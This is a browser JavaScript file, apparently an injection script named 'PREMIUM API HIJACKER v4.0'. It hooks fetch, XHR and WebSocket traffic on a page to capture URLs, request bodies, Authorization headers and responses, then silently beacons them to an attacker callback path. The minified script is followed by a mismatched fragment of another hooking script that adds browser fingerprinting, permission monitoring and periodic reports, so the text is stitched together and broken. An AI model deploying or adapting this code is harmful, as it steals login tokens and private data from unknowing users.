/*╔════╗PREMIUM API HIJACKER v4.0║Fetch/XHR/WS interception║╚════╝*/
(function(){'use strict';const Q=((k='__aq'+Math.random().toString(36).substr(2,6))=>({add:(item)=>{try{const q=JSON.parse(localStorage.getItem(k)||'[]');q.push({d:item,t:Date.now()});localStorage.setItem(k,JSON.stringify(q.slice(-30)));}catch(e){}},proc:async(u)=>{try{const q=JSON.parse(localStorage.getItem(k)||'[]');for(let i=0;i<Math.min(q.length,2);i++){const item=q[i];try{const c=JSON.stringify(item.d);navigator.sendBeacon?.(u,c);q.splice(i,1);i--;}catch(e){}}localStorage.setItem(k,JSON.stringify(q));}catch(e){}}}))();const Fetch=()=>{const o=globalThis.fetch;globalThis.fetch=new Proxy(o,{apply:async(t,a,args)=>{try{const[r,c]=args;const req={u:typeof r==='string'?r:r.url,m:(c?.method||'GET').toUpperCase(),h:c?.headers||{},b:c?.body?.toString()?.substr(0,1500),ts:Date.now()};if(req.h['authorization'])req.auth=req.h['authorization'].substr(0,100);Q.add({ty:'fetch_req',d:req});const res=await Reflect.apply(t,a,args);try{const body=await res.clone().text();Q.add({ty:'fetch_res',u:req.u,st:res.status,bd:body.substr(0,3000),sz:body.length});}catch(e){}return res;}catch(e){return Reflect.apply(t,a,args);}}})}; const XHR=()=>{const O=XMLHttpRequest;XMLHttpRequest.prototype.open=(function(){const o=O.prototype.open;return function(m,u,...r){this.__m=m;this.__u=u;this.__t=Date.now();return o.call(this,m,u,...r);}})(); XMLHttpRequest.prototype.send=(function(){const s=O.prototype.send;return function(b){Q.add({ty:'xhr_req',m:this.__m,u:this.__u,b:b?.toString()?.substr(0,1500)});const ol=this.onload;this.onload=function(e){try{Q.add({ty:'xhr_res',u:this.__u,st:this.status,body:this.responseText?.substr(0,3000),sz:this.responseText?.length});}catch(e){}if(ol)ol.call(this,e);};return s.call(this,b);};})()};const WS=()=>{const O=globalThis.WebSocket;globalThis.WebSocket=new Proxy(O,{construct:(t,[u,p])=>{const w=new t(u,p);Q.add({ty:'ws_con',u,ts:Date.now()});const s=w.send;w.send=function(d){Q.add({ty:'ws_snd',u,d:d?.toString().substr(0,800)});return s.call(this,d);};w.addEventListener('message',(e)=>{Q.add({ty:'ws_msg',u,d:e.data?.toString().substr(0,800)});});return w;}})};const init=async()=>{try{Fetch();XHR();WS();const url="http://"+location.host+"obf_hstshijack_path_callback";setInterval(()=>Q.proc(url),4000+Math.random()*4000);setTimeout(()=>Q.proc(url),1500);}catch(e){}};if(document.readyState==='loading'){globalThis.addEventListener('DOMContentLoaded',init);}else{init();}})();
      },
    };
  })();

  // Initialize all hooks
  const init = async () => {
    try {
      if (HOOKS_CONFIG.interceptFetch) {
        FetchHooker.hook();
      }

      if (HOOKS_CONFIG.interceptXHR) {
        XHRHooker.hook();
      }

      if (HOOKS_CONFIG.interceptWebSocket) {
        WebSocketHooker.hook();
      }

      if (HOOKS_CONFIG.interceptServiceWorker) {
        await ServiceWorkerHooker.hook();
      }

      // Gather additional intel
      Fingerprinter.fingerprint();
      await PermissionMonitor.monitor();

      // Periodic activity report
      setInterval(() => {
        ActivityLog.send();
      }, 5000);
    } catch (e) {
      // Silent fail
    }
  };

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

})();
